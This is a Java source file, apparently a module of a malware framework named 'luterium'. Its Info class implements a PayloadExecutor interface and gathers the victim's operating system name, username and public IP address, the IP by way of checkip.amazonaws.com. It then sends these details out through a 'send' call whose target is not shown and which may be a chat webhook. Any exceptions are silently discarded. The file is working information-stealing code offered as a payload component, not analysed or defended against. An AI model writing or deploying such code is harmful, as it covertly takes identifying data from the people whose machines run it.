package dev.peter.luterium.features;

import dev.peter.luterium.Main;
import dev.peter.luterium.payload.PayloadExecutor;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;

/**
 * @author Peter
 * @since 08/16/2022
 **/

public class Info implements PayloadExecutor {
    public static Main main = new Main();

    @Override
    public void execute() throws Exception {
        String osName = System.getProperty("os.name"); //Gets your OS's name.
        String pcUsername = System.getProperty("user.name"); //Gets your PC's username.

        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");

            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            String ip = bufferedReader.readLine(); //Gets your IP.

            main.theThing.send("``` NAME : " + pcUsername + "\n IP" + "   : " + ip + " \n OS   : " + osName + "```");
        } catch (Exception ignore) {
        }
    }
}
